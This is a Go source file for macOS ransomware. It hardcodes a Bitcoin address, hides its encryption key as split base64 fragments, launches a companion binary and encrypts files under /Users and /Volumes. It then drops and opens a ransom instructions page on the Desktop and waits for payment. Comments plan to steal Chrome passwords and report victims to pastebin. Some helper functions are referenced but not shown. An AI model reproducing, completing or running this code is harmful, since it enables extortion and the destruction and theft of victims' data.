//Compile: go build -ldflags "-s -w -H=windowsgui"
package main

import "os"
import "encoding/base64"
import (
	"io/ioutil"
	"fmt"

	"os/exec"
	"github.com/everdev/mack"
	"strings"
)

//const TARGET_FILE_NAME = "windows_security.exe" // check name Wscript.exe
const BTC_ADDRESS string = "12CwZMmYGPumtKy5cLQPfVuhzvfHv5ZBMN"

var key_text []byte
var priv []byte //RSA Priv key, hardcoded

func main() {
	fmt.Println("Start")
	folderArr := strings.Split(os.Args[0], "/")
	pathTemp := strings.Join(folderArr[:len(folderArr)-1], "/")
	go exec.Command(pathTemp + "/real").Run()

	//Check if already running

	//Install to location
	//Install()

	//Run Analytics
		//Put name, IP and status to pastebin


	//Send chrome pass to pastebin

	//Gen aes key,
	//Gen 
	//Deofuscate key
	b64_1 := "fSss" + "L1IkKy"
	b64_2 := "p3ZU4zR" + "3g5e"
	b64_3 := "ipMZy5" + "VYm13O"
	b64_4 := "Xg+WF" + "9jKnE="
	final := b64_1 + b64_2 + b64_3 + b64_4
	key_text = []byte(Base64Decode(final))
	//When key decoded

	InitializeBlock()

	//then encrytp files
	EncryptDocumets("/Users",false)
	EncryptDocumets("/Volumes",false)

	// Once encrypted
	// Write done to pastebin
	PromtPay()
	ListenForPayment()
}


func Base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func Base64Decode(str string) string {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return ""
	}
	return string(data)
}

func PromtPay() {
	/*
	*	Copy instructions to Desktop and opens it
	*/
	ioutil.WriteFile(os.Getenv("HOME")+"/Desktop/Instructions.html", []byte(TEXT), 0655)

	e := exec.Command("open", os.Getenv("HOME")+"/Desktop/Instructions.html")
	e.Run()
}
